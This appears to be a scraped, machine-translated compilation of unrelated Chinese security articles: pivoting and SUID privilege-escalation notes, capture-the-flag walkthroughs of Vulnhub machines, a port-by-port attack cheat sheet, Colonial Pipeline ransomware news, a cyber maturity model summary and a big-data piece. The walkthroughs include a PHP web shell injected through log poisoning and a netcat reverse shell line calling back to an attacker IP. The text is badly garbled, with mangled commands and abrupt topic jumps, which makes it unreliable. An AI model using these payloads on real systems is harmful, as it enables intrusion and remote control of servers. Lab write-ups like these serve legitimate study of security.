All right, So far we've taken two hosts: Ubuntu 14:192.168.52.20 for the Ubuntu 18:192.168.1.8 layer 2 network in the DMZ region, Draw the network topology as follows: Intranet penetration Second layer of network penetration adds a route to the 192.168.52.1/24 network segment to the meterpreter of the DMZ region Ubuntu 18: Routing forwarding can only bring msfconsole into the Intranet, The socks agent needs to bring other attackers into the Intranet.

We use earthworm to build the socks5 reverse proxy service.

Add a route to the 192.168.93.1/24 segment to the meterpreter of the second tier network Windows server: route forwarding can only bring msfconsole to the innet, and needs to build a socks agent for other attackers on the attack machine.

We used to build a secondary socks5 proxy service using earthworm.

However, the setting of the SUID permissions is only for the binary executable and makes no sense for the non-executable setting of the SUID.\ u200b\t\t During execution, the caller temporarily obtains the owner permission for the file that is only valid during the program execution.

Generally speaking, assume that we now have an executable with master r o o t, when we log in through a non-root user, we set it to run the binary executable under a non-root user, when the execution of the process will be root permission.

With this feature, we can set SUID through SUID. Before understanding SUID rights, we can simply look at how to set SUID permission View file permission. You can see the permission descriptor of the file changed to this means that the file has already obtained suid permission.

Binary executable rights with S U I D permissions set by root The now known binary executables with SUID permissions generally have the following commands to find all SUID executables running on the system.

To be precise, this command will find and output files with SUID permission bits and primary root and then redirects all errors to / dev/null, to list only those binaries where the user has access.

All of the above binaries will run with root permission, we can see the suid permission and belong to rootnmap: nmap2.02 to 5.21 In early nmap versions, with interaction mode, which allows users to execute shell commands into nmap interaction mode: the command m s f m s f using nmap, find is used to find files in the system.

Also, it has the ability to execute commands.

Therefore, if configured to run with SUID permissions, all the commands that can be executed via find will run as root.

The linux generally has nc installed we can also use nc broadcast or rebound shell broadcast shell: on attack machine: rebound shell on attack machine: the main use of Vimvim is an editor, yes, if run in SUID, it will inherit root users, so you can read all the files on the system.

The following command to shellBash via vim will open a bash shell. as root

This requires administrators to carefully study files with SUID permissions and not give exploitable files SUID permission to prevent SUID abuse from causing hackers to easily access root privileges when entering the server.

It also offers more than 100 compiled software and increasing numbers, a full-functional, easy-to-modify router operating system written from scratch.

This time, Fixun K3 is used as a suitable router.

The Target System target device chip type Subtarget target subtype is generally a clear option parameter made by the specific board subtype Target Profile for the version of different routers. Generally, the firmware file can be compiled by default.

These parameters are related to the Linux kernel or GCC compiler for OpenWrt developers, generally not using Build the OpenWrt Image Builder except the firmware and a firmware compilation environment that can be distributed to others in the team.

The first compilation recommends a single thread to start compiling the firmware you want.

Successfully compiled the firmware openwrt-bcm53xx-phicomm-k3-squashfs.The trx0x03 brushes the firmware into the router.

With the emergence of new technologies and new solutions, global cyberspace security also faces new threats and new challenges.

In the current situation of digital highly permeates all aspects of life, on the personal side, we will worry about whether our privacy security, information security is well guaranteed, on the enterprise side, will consider whether their security architecture is perfect and can resist unexpected network attacks; then, from what aspects of the national network security capability?How to guarantee it?This report provides the answer.

The National Network Security Capacity Maturation Model (CMM) is able to assist countries in ensuring cyber security and help countries understand what, which and why are effective in all areas of cyber security capabilities.

CMM2021 and its deployment can contribute to ensure that cyberspace and rely on its system can withstand increasing attacks, and governments and businesses can also adopt policies with the potential or ability to significantly improve cyberspace security and security, and respect personal privacy and freedom of speech.

In addition to examining national cyber security capabilities and rating them from the general technical dimension, the government, the society and even the media are also aspects of CMM investigation.

CMM divides the breadth of national cyber security into five dimensions: in each dimension, including elements, aspects, stages, and indicators, to assess national cyber security capabilities and determine the current stage and level.

CMM allows the benchmarking of cybersecurity capabilities in current countries.

Understand the requirements for achieving higher capacity levels, make clear areas for further investment, and how to demonstrate that capacity level.

Combining CMM reviews with national risk assessment, social and economic strategies allows for further prioritization for capacity improvement.

Five stages to determine the depth of national network security capability CMM for each dimension are defined five mature stages, and give the corresponding transactions: start phase —— capacity initial development formation stage —— establishment stage —— in the world leading strategic stage —— forecast future network security demand dynamic stage —— ready for future network security needs should be noted, there is a correlation between these dimensions.

For example, to make capabilities in one field work, demands are often made for others.

There is also a scenario where responses across multiple dimensions may be required when resources are limited and capacity enhanced as a priority.

Therefore, measurement (assessment) activities review countries across the entire CMM and all dimensions to allow full consideration of national capacity.

The five partially construct the National Cybersecurity Capacity Maturity Model Dimension (Dimension) are five dimensions that together cover the breadth of national cybersecurity capabilities assessed by CMM.

Each dimension consists of a series of elements that collect the core competencies needed to assess in that dimension.

They represent different "focal points" by which network security capabilities can be demonstrated and analyzed.

Elements (Factor) In these five dimensions, elements describe the meaning of having cybersecurity capabilities.

As essential elements of national capacity, these elements will then be used to measure the (national cyber security capacity) maturity stage.

The complete list of elements is designed to fully contain all of the country's cybersecurity capability needs.

Most elements consist of multiple aspects (Aspect) that simplify the indicators of the elements (Indicator) (directly related to evidence collection and metrics).

However, some factors with a relatively limited range of Factor have no specific aspects of Aspect.

Aspect (Aspect) When an element (Factor) has multiple components, these components are aspects (Aspect).

An element Factor consists of multiple aspect Aspect s.

The aspect is an organizational method that divides the indicator Indicator of elements into smaller clusters and is easier to understand.

The number of aspects depends on the topic present in the content of the element and the overall complexity of the element.

The phase (Stage) phase defines the extent of progress the country has made in some element or aspect of cybersecurity capabilities.

The CMM consists of five mature stages: startup, formation, establishment, strategic, and dynamic stages.

The CMM review will benchmark countries based on these stages, from which based on actions taken (or not) a country can improve or reduce existing cybersecurity capabilities, each of which the country must complete several indicators to successfully reach this stage.

The indicator (Indicator) index is the most basic part of the CMM structure.

Each metric describes the steps, actions, or building modules indicating a specific maturation stage.

In order to successfully reach a certain stage of maturity, the state needs to convince itself that it can prove every indicator.

To improve the maturity of the country's network security capacity, all the indicators need to be completed at a specific stage.

Most of these indicators are binary, where the country may either prove that it has met the index requirements, or is unable to provide such proof.

Report Catalog Media partner: FreeBufFreeBuf.COM is a leading domestic network security industry portal under Douxiang Technology. It publishes professional security information and technical analysis every day, and shares security resources and industry insights at home and abroad. It is a network security website and community that attracts the attention of security practitioners and enthusiasts.

FBI agents said law enforcement gained control of a private key belonging to the DarkSide Bitcoin wallet.

Using this private key, the FBI recovered 63.7 bitcoin out of the roughly 75 bitcoin payments sent by the Colonial Pipeline.

As the price of bitcoin fell sharply after payment, the recovered bitcoin is worth about $2.26 million at current prices.

It is unclear exactly how FBI gets access to the DarkSide wallet, but on May 14, ransomware gangs claimed they could have access to one of their payment servers.

Colonial Pipeline, the nation's largest fuel-pipeline company, paid Darkside nearly $5 million in ransom on May 7, Bloomberg reported.

The news contradicted earlier reports that the company had no intention of paying a ransom.

It is believed that Colonial decided to pay the ransom under great pressure to resume pipeline operations.

The hacker provided decryption tools after receiving the ransom, but the entire decryption process was so slow that Colonial continued to use backup to restore the system.

Colonial announced its resumption of operations on May 12, but said it would take days for the entire fuel supply chain to return to normal.

The $5 million ransom is very low for a company like Colonial, and ransomware gangs may also realize their targets are pretty tricky and could trigger a strong government reaction.

The U. S. government is generally opposed to paying the ransom because it inspires attackers to find the next extortion target.

FBI and CISA issued joint alertThe FBI and the CyberSecurity and Infrastructure Security Agency (C I S A) issued a joint alert after a devastating ransomware attack on Colonial Pipeline.

The alert was released on May 11, local time, and contains some background information about the DarkSide.

"Cybercriminal gangs used DarkSide to access the victims' network to encrypt and leak the data, which then threatened to expose the data if the victim did not pay the ransom.

The DarkSide gang has been working on different groups recently, including the manufacturing, law, insurance, health care and energy sectors."DarkSide's ransomware targets RaaS (also known as the ransomware alliance program) customers.

This approach to cybercrime is now quite popular because only a core team is needed to develop malware, and RaaS can provide ransomware to criminals by subscription.

In addition, when the ransom is paid, the creator receives a portion of the profit.

In exchange, the developers keep improving their malware products.

DarkSide even built itself a Robin Hood-like setup that does not target medical care, care homes, or treatment providers, or even donated to it.

citing New York Times reporter Nicole Perlroth, an initial investigation by Colonial Pipeline indicated that the "most likely culprit" in the company's I T infrastructure was the unrepaired Microsoft Exchange service.

Nicole Perlroth noted in the tweet that forensic findings about Colonial Pipeline found they were still using a flawed Microsoft Exchange version of Microsoft.

On May 10, the DarkSide ransomware gang released a press statement saying that their organization was "non-political" and had no thing to do with any government.

At the same time, they say not to connect them with any government, and their goal is to make money, not for certain social issues.

In addition, the gang said that from May 10, they would check the target before the attack to avoid certain social consequences.

On May 9, multiple states announced an emergency easing of the restrictions on road transport of fuel, targeting a ransomware attack.

Releasing restrictions means that drivers in the following 18 states can transport more cargo or have more time when transporting gasoline, diesel, jet fuel, and other refined oil products.

The emergency regulations contained the 18 states as follows: Alabama, Arkansas, District of Columbia, Delaware, Florida, Georgia, Kentucky, Louisiana, Maryland, Mississippi, New Jersey, New York, North Carolina, Pennsylvania, South Carolina, Tennessee, Texas, and Virginia.

The decision was due to a cyber attack on Colonial, which operates the largest gasoline and diesel pipeline, leading the pipeline to deliver oil and gas to major cities along the eastern coast.

Colonial, which hired third-party cybersecurity companies to investigate and contacted law enforcement agencies, said it was trying to resume operations to minimize its impact on customers.

The affected pipeline, about 5,500 miles long, provides 45% of the fuel supply to the eastern U. S., and delivers 2.5 million barrels of oil a day from the Gulf of Mexico through the eastern US to New Jersey, providing gasoline, diesel, and fuel to fuel distributors in major cities from Houston to New York.

NYSE gasoline futures rose 1.32 cents to close at $2.1269 a gallon on the attack.

It is unclear whether the attack was targeting Colonial's industrial control system or which attack group the attack was initiated.

The Times said the pipeline shutdown was unlikely to have an immediate impact on consumers, and that most of the fuel delivered would not be directly sold.

And energy consumption in the U. S. has decreased due to the outbreak, but it remains unclear how long the pipeline will be closed.

Due to its bad impact, the extortion attack has already raised calls from US lawmakers to strengthen protection of U. S. key energy infrastructure against hacking.

To prevent such recurrence, the Department of Homeland Security (Department of Homeland Security) is taking the first action to regulate cybersecurity in the pipeline industry.

The attack on Colonial Pipeline triggered a gasoline shortfall in the southeast and even the capital, and led to panic buying.

If its pipeline continues to stop supply, it will have a major impact on airlines, public transport, and diesel-dependent chemical refineries.

Eventually, the company had to pay $4.4 million to the hackers to free its system back to operations.

The tubing attack highlights the vulnerability of key infrastructure to cyber attacks.

The DHS Transportation Security Administration will issue a security directive this week requiring pipeline companies to report cyber accidents to federal authorities, senior DHS officials said.

It is understood that the agency has provided guidance in a voluntary nature in the past.

But now, the officials say they will introduce an effective set of mandatory regulations in the coming weeks providing for pipeline companies to take steps to protect their systems from cyber attacks and to provide measures that should be taken during hacking.

It will also be the first mandatory pipeline network security regulation.

The Biden administration is taking further action to better protect key infrastructure, said Homeland Security spokesman Mike Salapek said in a statement.

The TSA is working closely with the Network Security and Infrastructure Security Agency to coordinate with companies in the pipeline industry to ensure that they take the necessary steps to improve their response to cyber threats and protect their systems.

SQL injection refers to that the web application does not judge or filter the legality of the user input data. The attacker can add an additional S Q L statement to the end of the predefined query statement in the web application to realize the illegal operation without the knowledge of the administrator, so as to deceive the database server to perform an unauthorized arbitrary query, and thus further obtain the corresponding data information.

MYSQL MySQL is a relational database management system, MySQL is one of the current mainstream relational database management system, the same type and Access,SQL Server, different databases have their own unique features, but in the operation of the database, the basic syntax is mostly the same, here is a brief description of MySQL add to delete the basic syntax, this is also we usually use more several statements.

After the pre-knowledge introduction, we can directly enter the target site. First of all, we should make it clear that basically every level of our target site is to get the user name and password in the database, so that it is passed.

Pages interact with the database and return different information depending on the user input id values.

Anywhere interactions with the database arise, injections can exist.

Therefore, we generally use order by to judge the number of fields in the table first. In MySQL, the original purpose of order by is to sort, such as: order by a certain field name, then the query results of the statement will be resorted according to this field.

Or, order by x (x is a number), then the query results of the statement will be resorted according to the x field in the table, we can use this feature to query the number of fields in the database table: assuming only 10 fields in a table, then we traverse through order by 1-11, at 1-10, the database can execute statements, but when the database reaches the 11th field, we can determine the number of fields in the table.

Entering the fifth level, found different from previous passes, with only one " You are in...........”。

Single quotation mark reported error, double quotation marks return normal, the following figure: then we still close first, try joint query injection, determine the display bit, payload is as follows: but there is no return data as we imagined, here is still show " You are in...........”。

But the premise: the server opens the error return return, that is, the error return when the error occurs.

Common utilization functions are: exp(), floor () + rand(), updatexml (), extractvalue (), etc.

Let's only introduce updatexml() here, the common grammar format is as follows: then let's try the error injection, payload as follows: then the level is blind note, leave it to write.

The previous levels will be written in relatively detailed detail, and the later levels may be omitted if you encounter repeated steps.

So the —— password changed to shell, payload and crypboth changed to php type.

docker system df trim: docker system prune-a found that the target site can still be open, the original purne can only trim the mirror without running.

Verify: docker-compose up-d, is expected to download the mirror again.

Each mirror will have crack targets, mostly the Boot2root, from starting the virtual machine to getting the root permission for the operating system and viewing the flag.

Operation Description Target Machine Name: Os-Bytesec Target machine difficulty: Beginner / Intermediate Target: There are two flag, one user-flag,ip found that first open the currently surviving i p in the kali linux, scan kali network segment, there are currently six surviving ip.

Start the ByteSec target machine, the interface is as follows: did not directly tell the ip address, it seems that we need to detect ourselves.

Since both the attack machine and the virtual machine network are set in bridging mode, using Nmap to scan the kali network segment C segment ip, you can find the target machine ip, command: one more ip, compare with the above 6 ip, get the target machine ip:102.168.199.148 port and service identification ip already has, let's take a look at what port Ta opened.

Check out the source code, and there are no useful clues either.

Click on n e w s, which is also a picture, does it hint to me anything more?Well, there's no clue from these clues.

Looking from the website cannot give us no valuable information for the time being.

Baster directory explode a directory, here use dirb for directory blasting.

It seems that you can only put down the site first and see any smb vulnerabilities to exploit?When it comes to smb, the Cousins must be the Windows MS-17-010. When I planned to offer the msf to collect a shuttle, I suddenly remembered that the target machine was the Ubuntu system.
It seems that there is a play, look at the use of smbclient: a meet login, first must try the weak password, after many attempts, test the account name is s m b, the password is empty.

There are only 2 files in there.

Put safe.Download the zip to the local.

After downloading to the local attempt to be decompression, I found that a password is required for decompression.

Is there a password?The weak password continues to arrange on.

No on the blasting arrangement, no password can not burst out.

Cousins have better compression package blasting tools or their own written blasting tools can arrange their own.

Here I use fcrackzip, if not, install with the following command: blasting using the dictionary brought by kali, use fcrackzip blasting if you want to use the dictionary, you must add the-p parameter, -u is to specify the zip format to solve the compression password, and then decompress to get two files, secret.The jpg and the user.The capuser-flag opens the u s e r with the Wireshark.The cap looks, it is a wireless packet.

Crack to u s e r using aircrack-ng.cap document.

Find a username blackjax and password snowflake.

Then try the ssh connection test and connect successfully.

Check what files the current directory and find the current directory has a user.txt document.

View the file content: After discovering the first user-flag, decoding, abhishek, also has a root flag, estimated to improve the permissions to see.

Permission promotion to view the target machine Ubuntu version number, and search for available lifting methods according to the current version.

Constantly looking for ways to improve the power, constantly testing (due to space reasons, the test failure is not listed one by one), hard work pays off, and finally found an article explaining various methods for Linux power promotion.

The step that requires gcc compilation can not be completed because the target system has not installed g c g and the current permissions limit the installation.

But our current situation is the same as in the author example, also login to the target system, and then into the lifting stage.

Let's first try to follow the author's steps in the article to see if it works?Search for the file with 4000 permission for S U I D or 4000 with the help of the find command.

Then we go into / usr/bin, and see that netscan is suspicious because scan, Cousins should understand.
So we run this file and here it looks like the file netscan is trying to run netstat, This is a real file in / bin that can view the port status.

Continue with the next root-flag successful lift to root privileges.

Under the root directory, there is a root.The txt file, and view the file.

By this point, all 2 flag:user-flag and root-flag have been found.

On the website takes a long time, blasting directory, fuzz sensitive files, etc., or do not knock to the end, a hit for other goals, is not to say to completely give up, temporarily no idea small this remember, perhaps one day have an inspiration to return to test; blasting compression package password began to use-b parameter violent crack, more time-consuming.

Check the nmap scan again and find the following result nmap gives the address unable to track the jump to http://dc-2/, so we need to add hosts.

Find the first flag.

We need a username to log in, and there is a key: cewl, a linux dictionary generation tool, the biggest feature is the ability to crawl information from the website and generate a dictionary.

Click the Pages button to see to flag2, for flag2 translated as: we can only find flag from another entry.

Using the previous blasting user name and password to login jerry/adipiscingtom/parturient using jerry login was denied login and can login using tom user only.

At ssh, but cannot view flag. using cat or vim

Clues point to jerry, prompts to switch usersusing s u.

Each mirror will have crack targets, mostly the Boot2root, from starting the virtual machine to getting root permission to the operating system and viewing the flag.

Download the good virtual machine mirror files directly from the official website.

The decompression yields one.The file for ova and then open in VMware.

Environment configuration configuration attack machine.

Using nmap scan to 192.168.0.119 with 80 ports open.

Visit: The http://192.168.0.119:80, page is Drupal., via the Wappalyzer or the CMS at the bottom of the page
View the robots.'s robots.The txt protocol, the scan directory gains nothing.

Use msf to find out the Drupal vulnerability and then try one by one to see if it can be exploited.

The default profile for the Drupal is: settings.And php, look for the settings.The path find-name "settings. where the php file is locatedphp”cat /var/www/sites/default/settings.Get the flag2. in the php profile

The file is only modified by the administrator, but is readable for all users.

Only the file can be modified and viewed by the system administrator, and other users cannot view or modify it.

The last flag is in the root directory but has no read and write permission so go to the lift.

Scanning wfuzz-w wordlist-w wordlist-u URL/FUZZ = wfuzz 2 Z found that most of the measured character length was 851 c h, so the correspondence of this length character was filtered out: wfuzz-w wordlist-w wordlist--hh 851-w URL/FUZZ=FUZ2Z discovery variable name and file: file=footer.php 。

Using burpsuite to intercept the contact process, file is available parameters.

Send to Repeater, after intercept changes file to / etc/passwd, to view content in passwd.

Turn the file to / var/log/nginx/access.Under log log file: change f i l e in burpsuite to <?php phpinfo(); ?>, See if you can record in the log file to slide in the log file can be recorded in the log file, therefore, after thinking of f i l e input <?php system($_GET[\'cmd\']); ?>, Then run n c bounce shell.

Open the listening port in kali and connect to it: Get an interactive shell. with Python

Get flag filters unaccess directory out find / name-perm-u=s-type f 2> / dev/null, Get result: Found suspicious file screen-4.5.0, search for the file vulnerability.

Discovery shell copied the shell to the / var/www/html directory: View the permissions of all directories under the dc5 target, found that the tmp path has all permissions, so switch to the tmp path, download the 41154.sh file run and found that it could not run.

So look at the contents of the 41,154 file.

Set the three parts to three different file names as libhax.c, rootshell.c, run.The sh, note that the last file begins to add #!/ bin/bash, Then run the code gcc-fPIC-shared-ldl-o libhax.so libhax.crm -f /tmp/libhax.cgcc -o rootshell rootshell.crm -f /tmp/rootshell.The c found that it still failed to run.

Each mirror will have crack targets, mostly the Boot2root, from starting the virtual machine to getting root permission to the operating system and viewing the flag.

Download the good virtual machine mirror files directly from the official website.

The decompression yields one.The file for ova and then open in VMware.

Change the / bin/sh permission to 4777 by the executed script so that it can be executed under a non-root user and has root permissions during execution.

Add new user lift add a a d m i n account and then use teehee execution to write directly into passwd and then switch to the created admin user.

Each mirror will have crack targets, mostly the Boot2root, from starting the virtual machine to getting root permission to the operating system and viewing the flag.

With port 80 scanned, just visit the 3, directory scan (I am using the dirsearch tool) and scan to a login interface.

Tried to explode, failed, maybe their own dictionary is too lj, only to try the other way.

1. Later, click the module of the De\'tails navigation bar, found that the u r l has parameters, and try the sql injection decisively.

Get the username admin and john, the password is encrypted and needs to be decrypted.

Place the resulting account name and password into the text file.

Log in with the resulting account name and password.

Found the Contact Us page can be modified so you can write a shell, and bounce it to the attack machine.

Write to the shell <?php system("nc -e /bin/sh 172.20.10.3 1234"); ?>。

Then go back to the view page and fill out something to submit while starting listening on the attack machine.

The linux can only execute a script in unix format.

Use set ff = unix: to tell the vim editor to use the unix line changer or the script cannot be executed.

As the so-called goes, knowing yourself and the enemy in a hundred battles, information collection is the guarantee of successful penetration test, only after we have enough information from the target website or target host, can better penetration test.

Information can be collected and divided into two ways: active and passive.

Active information collection through direct access to the site, operation on the site, scanning of the site, etc.

This is the way of information collecting with network traffic passing through the target server.

Passive information collection is based on public channels, such as search engines, obtaining information without direct interaction with the target system and try to avoid leaving traces.

These two ways have their own advantages. Active information collection and you can get more information, but the visual traces are more obvious and easy to be traced back.

Passive information collection is not collected for the site, but your actions will not be discovered by the target host.

Therefore, we need to flexibly use different collection methods, in order to ensure the integrity of information collection.

Website information collection operating system servers common operating systems are basically only two: windows and linux, linux system in the majority of enterprise servers, common judgment methods have three ping judgment, windows TTL value is generally 128, and Linux is 64.

So a TTL greater than 100 is generally windows, Dozens of them are generally linux, but, Nor is it 100 percent accurate to judge the server type by the TTL values, There are some windows servers whose TTL values are also dozens of dollars, And some servers ban ping, The nmap scan cannot be detected in this way, The operating system can be scanned by, or by the parameters, The advantage is that you can scan to specific operating system versions, The disadvantage is that the scanning traces are obvious, Easy to find windows case-insensitive, The linux, on the one hand, is case-sensitive, This can also be used as the basis for judging the operating system, We can try to change the path part to upper case when visiting, Then go to the visit, See if the request is successful.

Website Service / Container Type The web servers commonly used on web sites are: Apache, Nginx, Tomcat, IIS.

After knowing what type of web server is, we also have to probe the specific version of the web server.

For example, Ngnix version <0.83 will have a resolution vulnerability, IIS6.0 will have a file name resolution vulnerability, IIS7.0 will have a deformity resolution vulnerability, etc.

Different web server versions, there are different vulnerabilities.

Script types Common script types for websites: php, Jsp, Asp, Aspx, python.

M y s q l, the wappalyzer database type common to the database type, is a relational database management system, developed by MySQL AB, Sweden, and is currently a product of Oracle.

MySQL is the most popular relational database management system, MySQL is one of the best applications, MySQL database is mostly php pages.

The default port is that the 3306Sql Server is a Relational Database Management System (DBMS), developed and promoted by Microsoft, and is a relatively large database.

The Port number is 1433.

Database suffix name.The mdfAccess full name is Microsoft Office Access, is an associated database management system published by Microsoft.

Small databases, whose performance decreases when the database reaches around 100M.

Database suffix name:...The mdb is generally an asp web file using the access database Oracle aka Oracle RDBMS, or Oracle. simply

It is a relational database management system for Oracle Corporation.

Often used in relatively larger websites.

The default port is the 1521 common collocation: ASP and ASPX:ACCESS, SQL Server + winPHP:MySQL + win/linux, PostgreSQL + linuxJSP:Oracle, MySQL + win/linuxCMS recognize common CMS:dedecms(dreams), Discuz, phpcms, etc.

Sensitive directory, background common directory type background directory: weak password, universal password, blasting backup files: get database information, even website source upload directory: truncated, upload pictures horse mysql management interface: weak password, blasting, universal password, and then get database information installation page: can secondary installed and bypass phpinfo: will expose your configuration information editor: fck, ke common tools Waf website W a f recognition Web application protection system (also known as website application level intrusion defense system.

Web Application Firewall is a product that provides protection for W e b applications by executing a range of security policies for HTTP/HTTPS.

Function: prevent common kinds of network attacks, such as SQL injection, XSS cross-station, CSRF, web back door, etc.

Prevent all kinds of automated attacks, such as: violent cracking, library collision, batch registration, automatic posting, etc.

Prevent other common threats such as: crawler, 0DAY attacks, code analysis, sniffing, data tampering, overreach access, sensitive information disclosure, application layer DDOS, remote malicious inclusion, chain theft, overreach, scanning, etc.

Domain Name introduces a domain name, also known as a network domain, which is the name of a computer or computer group on an Internet composed of a string of names separated by points, used for the positioning and identification of the computer during data transfer.

Because IP addresses have inconvenient memory and cannot display the name and nature of the address organization, people have designed domain names and map domain names and IP addresses through the domain name system to make people more easily access the Internet without remembering the number of IP addresses that can be read directly by the machine.

Domain name Top level domain name: Government domain name:.The gov commercial domain name:...The com education domain name:...Secondary edu domain name: * * baidu.The com level 3 domain name: * * www.baidu.comWhoiswhois is a transport protocol used to query the IP of the domain name as well as information such as the owner.

It is a database used to query whether the domain name is registered, and register the details of the registered domain name (such as: domain name owner, domain name registrar), in general for the small and medium-sized website domain name registrar is the website administrator.

The domain Whois server queries domain attribution contact information, as well as registration and expiration times.

The basic content is to first establish a connection to send the query keyword to the TCP port 43 of the server and add the traffic change, and then receive the query results of the server.

Method of whois query: record information query method ICP record introduction: Internet Content Provider network content provider.

The State shall implement a licensing system for operating Internet information services and a filing system for non-operational Internet information services.

Query method: Whois backcheck (registrant / mailbox backcheck) to first obtain the registrar and mailbox through whois, and then backcheck the domain name through the registrar and mailbox.

* * Disadvantages: * * Many companies are registered by DNS resolved operators, and they find the website information registered by operators in place of individuals and companies.

Subdomain name collectible subdomain name refers to the secondary domain name, which is the next level of the top-level domain name (primary domain name).

for example:mail.baidu.The com and bbs.baidu.The com is the baidu.Subdomain of com, while baidu.The com is the top-level domain name.Subdomain of the com.

CDN is a content distribution network built on the network. Relying on the edge servers deployed in various places, through the load balance, content distribution, scheduling and other functional modules of the central platform, users can obtain the required content nearby, reduce the network congestion, and improve the response speed and hit rate of user access.

Use various services of multi-ground ping to see if the corresponding IP address is unique, if not unique is mostly using CDN.

Using nslookup detection, the principle is the same, if the return domain name resolution corresponding to multiple IP addresses mostly use CDN to bypass cdn foreign access because cdn setting is cost, so many websites do not include foreign access when setting CDN, so you can bypass through external network access.

These virtual hosts have different domain domains, but typically use an IP address.

If you know which sites share this server, it is possible to gain control of the server through a vulnerability in other sites on this server and then circuitous gain permissions to penetration targets, also known as "bypass."

Scan the c segment ip information port information through the Internet of Things search engine on the Internet, each hosts send and receive packets through the TCP/IP protocol, and each packet performs routing in the interconnection network according to the IP address of its destination host, so as to smoothly transmit the packet to the target host.

Protocol ports can be divided into two ports depending on the type of service provided: TCP ports: CP is a reliable transmission layer communication protocol for connectivity.

UDP port: UDP is an unreliable transport layer protocol without connection.

The TCP protocol and the UDP protocol are independent, so the respective port numbers are also independent of each other.

Port type Known Port: A well-known port number, range: 0-1023, such as: Port 80 is a WWW service.

permeate common port FTP-21FTP: file transfer protocol using TCP ports 20,21,20 for data transfer and 21 for transmitting control information.

The ftp base blasting: the Bruter,hydra in owasp and the f t p blasting module in msf.

Anonymous access to ftp: User Name: anonymous Password: Empty or any mailbox vsftpd Backdoor: There is a backdoor vulnerability from vsftpd2 to version 2.3.4, through which root permissions are obtained.

Sniffer: ftp transmission using plain text and permeabilization using Cain.

The ftp remote code overflow.

The ftp jump attack.

Weak password, you can use the s s h blasting module in tool hydra,msf.

The SSH Backdoor openssh users enumerate the open ports of the CVE-2018-15473HTTP-80 Hypertext Transfer Protocol (HTTP), mainly used as protocols for transmitting information over the World Wide Web.

Middleware vulnerabilities such as 80 ports like IIS, apache, ngnix are generally attacked through common vulnerabilities in web applications.

NetBIOS SessionService-139/445139 is used to provide windows file and printer sharing and S a m b a services in UNIX.

445 Use to provide windows file and printer sharing.

For open port 139 / 445, try to exploit the MS17010 overflow vulnerability.

For only 445 ports, try to exploit the MS06040, MS08067 overflow attack with IPC$ connections.

MySQL-33063306 is the default listening port of the mysql database mysql weak password crack weak password Login mysql, upload constructs a malicious UDF custom function code that performs system commands by calling a registered malicious function.

The SQL injection gets the database sensitive information, the load_file() function reads the system file, and exports the malicious code to the specified path.

RDP-33893389 is the windows Remote Desktop Service Default Listening Port RDP Violence Break Attack MS12_020 Death Blue Screen Attack RDP Remote Desktop Vulnerability (CVE-2019-0708) MSF Open RDP, Registry Open RDPRedis-6379 open-source memory-based durable log-based database.

Blasting weak password redis unauthorized access combined with ssh key master replication rceWeblogic-7001Weblogic is an application server, exactly a JAVAEE architecture based middleware, WebLogic is a J a v a application server for developing, integrating, deploying and managing large distributed Web applications, web applications and database applications.

Now also can only look at the information, can not expect too much, can not find the real information, many are to show Ali cloud.

Or you can try and read other information that may be used as a social worker.

Other tools: layer subdomain name excavator, royal sword, subDomainsBrute, K8, search engine query (site:www.xxx.com) ping detection (with or without CDN): if multiple addresses are detected, the CDN service is used, and only one description does not.

Because the mail system is generally internal, so you can get real IP6. General sites may have CDN in China, but foreign user coverage is relatively low, so through foreign nodes often can obtain real IP7. Other * can judge through Ping (win- -cmd).

In order to subsequently improve the rights and other operations, the first step is to get the permission of the current machine as far as possible, so it is also necessary to get the information collection of the current machine.

View system configuration information to view system information, but at some points can not see the results through the kitchen knife and other tools, can be output content to a file, or can query specified content, such as query operating system information, the instruction input content is more, in addition to using selection output, some information can be displayed separately using other instructions, such as view system architecture, view system startup time patch information can use access WMIC extension WMI, provides support from the command line interface and batch command script.

With incomplete data found in cmd such as pid for certain processes when wmic operates, WMIC offers a lot of global switches, aliases, verbs, commands and rich command lines to help enhance the user interface.

View the software version of the system installation, etc.

Beyond the first time, You can also view system service information using and view firewall configuration information, View the initiator information, Query of native service information can also use the query process information, View scheduled tasks View ports list Note, General view of the process ports, Check the process pid first, View the system login information at the pid check port, User information for logged in to the system, List the connection session information, However, high permissions are generally required to perform automatic information collection. Many post-penetration modules can conduct information collection, Not to talk about it here, Share a whoring script copied as a file, The results are saved in, The name path can be modified by itself.

Domain information collection determines whether there is a domain, if the current account is a domain user, the result is usually, if it is a double network card, generally exists an internal network, if in the domain, otherwise, in the domain, the full computer name is not in the domain in the figure below, view the time server, the dns server and time server in the domain machine is usually the domain controller.

Note: Not all machines have installed this service.
View user & machine & session related information view machine related information, query domain information, judge the current machine joined domain, all the query domain in the domain, there is a crucial machine called domain controller, known as domain control, machine name is usually, in the actual environment, domain control is one main one standby two.

The first era of "big data" was McKinsey, a world-renowned consulting firm. McKinsey said: " Data has penetrated into every industry and business function field today, and has become an important production factor.

The mining and use of massive amounts of data indicates the arrival of a new wave of productivity growth and consumer surplus.In fact, big data has been used in physics, biology, environmental ecology, as well as military, finance and communication industries, only a little niche. In recent years, the development of the Internet and information industry has attracted people's attention.

Large number refers to the huge data volume, over time, storage units from the past GB to TB, and even the current PB, EB levels.

Alibaba currently produces and processes data every day to the PB level (1PB is equal to 1024 * 1024 G data), and such a large scale data requires intelligent algorithms, powerful data processing platforms and new data processing technologies to statistics, analyze, predict and process in real-time.

A wide range of data sources determines the diversity of big data forms. Data types are not only text forms, but more pictures, videos, audio and other types of geographical location information.

The generation of big data is very fast, mainly transmitted through the Internet, and also has very strict requirements for the processing speed. It needs to obtain high-value information quickly from various types of data. The growth speed and processing speed of data are important manifestations of the high-speed of big data.

The real world generation of valuable data, a small proportion of valuable data, take video, an hour of video, in the uninterrupted monitoring process, may be useful data only one or two seconds.

Big data is considered as a new analytical tool to rediscover and recognize the world, and will change the way and thinking patterns that people recognize and explore the world, and prediction is one of the biggest uses of big data.

In order to facilitate everyone to better understand, Fuyun Jun will explain the actual application of big data in life through the simple introduction of JD's proprietary smart logistics.

The traditional e-commerce logistics is a mode of equal delivery, that is, after customers place an order online, merchants deliver goods from remote origin to customers, and JD's proprietary intelligent logistics has changed the traditional working mode of equal delivery delivery greatly. JD can predict orders and allocate power in advance.

Jingdong will be divided into seven regions, establish seven logistics center, each big warehouse has its own service radius, based on jingdong huge online sales data, through the combination of big data and artificial intelligence technology, forecast for the next month every commodity sales, let the logistics center in advance, so that after the customer order, can directly from the nearest logistics center to the customer, namely the customer before the order, jingdong has sent the customer want to the nearest logistics center.

